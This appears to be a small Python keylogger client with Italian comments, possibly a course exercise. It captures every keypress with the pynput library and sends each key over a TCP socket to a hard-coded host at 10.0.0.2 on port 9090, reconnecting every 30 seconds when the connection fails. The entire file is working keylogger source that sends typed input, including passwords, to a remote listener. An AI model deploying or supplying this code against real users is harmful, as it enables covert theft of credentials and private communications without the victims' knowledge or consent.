# Client Program
import socket
from pynput.keyboard import Listener #Libreria per leggere i caratteri digitati sulla tastiera
import time

connected = False 
while not connected:
    # Crea il socket "stream based" basato sul protocollo TCP ed indirizzi IPv4
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
    # Connetto il client al server
    print("> Connessione... ")  

    try:  
        clientSocket.connect(("10.0.0.2",9090))
        connected = True  
        print( "> Connessione eseguita" )

        # Funzione che si occupa di inviare il carattere digitato.
        def on_press(key):
            clientSocket.send(str(key).encode())

        # Creo un istanza di un listener che registra tutte le pressioni dei tasti.
        # Il costruttore prende la funzione creata e usa il metodo join per joinare l'istanza nel thread principale.
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()

        except socket.error:
            print( "  >> Connessione persa" ) 
            connected = False

    except socket.error:  
        print("  >> Connessione fallita")
        time.sleep(30)  